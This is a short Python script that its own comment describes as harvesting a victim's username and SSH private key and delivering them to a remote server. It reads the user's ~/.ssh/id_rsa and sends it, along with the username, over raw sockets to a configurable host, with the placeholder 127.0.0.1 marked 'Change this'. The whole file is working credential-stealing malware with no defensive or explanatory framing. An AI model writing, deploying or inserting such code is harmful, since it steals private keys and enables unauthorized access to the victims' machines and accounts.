#!/bin/python3.9
import getpass
import os
import socket
import time

# This script will harvest the victim's username and ssh keys
# and deliver them to a remote server

RHOST = "127.0.0.1" # Change this
RPORT = 9000

# Get the username
def getuser():
    username = getpass.getuser()
    with open("user.txt", "w") as theuser:
        theuser.write(username)
    with open("user.txt", "rb") as theuser:
        user = theuser.read()
    s = socket.socket()
    s.connect((RHOST, RPORT))
    s.send(user)
    s.close()
    os.remove("user.txt")

# Collect the key
def getkey():
    user = getpass.getuser()
    ssh_directory = f"/home/{user}/.ssh"
    os.chdir(ssh_directory)
    filename = "id_rsa"
    with open(filename, "rb") as thefile:
        key = thefile.read()
    s = socket.socket()
    s.connect((RHOST, RPORT))
    s.send(key)
    s.close()

getuser()
time.sleep(3)
getkey()
